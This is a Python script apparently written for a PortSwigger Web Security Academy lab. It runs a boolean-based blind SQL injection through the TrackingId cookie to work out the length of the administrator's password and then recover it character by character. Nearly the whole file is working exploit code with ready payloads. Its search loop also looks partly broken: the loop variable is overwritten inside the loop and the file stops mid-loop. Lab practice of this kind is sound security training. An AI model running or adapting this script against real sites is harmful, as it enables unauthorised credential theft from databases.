#!/usr/bin/python3

import requests
import sys
import string

if len(sys.argv) != 2:
    print('USAGE: blind.py <word to grep>')
    sys.exit(1)

print("Please update the session and also playload based on your needs and the db values")

TrackingId = "TrackingId=rIXQ0euA98n1Rau6"
session = "; session=GTfIvxW0vHT53TL9UfGkDBR1n8jVMZpl"
len_found = False
word = sys.argv[1]
url = \
    'https://acec1f721ee5b78680ef4ece002b00b0.web-security-academy.net/filter?category='
count = 1
while (len_found == False):
    ok = "Trying..." + str(count)
    print(ok, end="\r", flush=True)
    pay = "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>"+str(count)+")='a"
    ses = TrackingId + pay \
                + session
    headers = {'Cookie': ses}
    #print('try 0')
    #print(ses)
    r = requests.get(url, headers=headers)

    if word not in r.text:
        #print('we are here')
        len_found = True
    count += 1


pay = \
    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')"
l = count
passs = ''
for i in range(1, l):
    pay = ("' AND (SELECT ASCII(SUBSTRING(password," + str(i) \
        + ",1)) FROM users WHERE username='administrator')")
    found = False
    inti = 48
    fina = 122
    i = 48
    j = 122
    total = 74
    while found == False:
        re = "Retriving.." + passs
        print(re, end="\r", flush=True)
        #print ('i={0},j={1},current={2}'.format(i, j, inti + int((max(i,j) - min(i, j)) / 2)))
        current = inti + int((max(i, j) - min(i, j)) / 2)
        #print('int={0},chr={1}'.format(current, chr(current)))
        test = pay + "='" + str(current)

        # print(test)

        might = False
        t = 0
        if might == False:
            ses = TrackingId + test \
                + session
            headers = {'Cookie': ses}
            #print('try 1')
            #print(ses)
            r = requests.get(url, headers=headers)

            if word in r.text:
                #print('we are here')
                might = True
                found = True
                passs += chr(current)
        if might == False:
            test1 = pay + "<'" + str(current)
            ses = TrackingId + test1 \
                + session
            #print('try 2')
            #print(ses)

            headers = {'Cookie': ses}

        r = requests.get(url, headers=headers)
        if word in r.text:
            #print('found')
            t = 1
        else:
            t = 0

        if t == 0:
            i = current
            inti = current
        elif t == 1:
            j = current
